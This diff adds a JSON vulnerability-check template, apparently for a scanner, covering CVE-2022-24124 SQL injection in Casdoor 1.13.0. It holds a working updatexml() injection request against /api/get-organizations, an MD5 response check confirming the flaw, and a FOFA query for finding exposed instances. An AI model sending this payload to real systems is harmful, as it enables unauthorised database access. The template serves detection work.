@@ -1,0 +1,37 @@
+{
+  "product": "Casdoor",
+  "vul_name": "Casdoor 单点登录系统SQL注入",
+  "type": "SQL注入",
+  "vul_id": [
+    "CVE-2022-24124"
+  ],
+  "level": 3,
+  "vul_desc": "Casdoor 是一个开源的，基于 OAuth 2.0 / OIDC 的中心化的单点登录（SSO）身份验证平台，简单来说，就是 Casdoor 可以帮你解决用户管理的难题，你无需开发用户登录、注册等与用户鉴权相关的一系列功能，只需几个步骤进行简单配置，与你的主应用配合，便可完全托管你的用户模块，简单省心，功能强大。Casdoor单点登录系统存在未授权SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。",
+  "version": "1.13.0",
+  "note": "",
+  "search": {
+    "FOFA": "title=\"Casdoor\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s?__biz=MzkxMTUyMjUxMw==&mid=2247515729&idx=1&sn=af1a318e0db9ab7978dc790b2d227b7f&chksm=c11811eff66f98f9c52bf50456d5ba7e353584ea25967b4a5c8b12a33d308cc6dc7207f3d714&scene=178&cur_album_id=3044583184195190791#rd",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/api/get-organizations?p=123&pageSize=123&value=cfx&sortField&sortOrder&field=updatexml(null,MD5(123456),null)"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
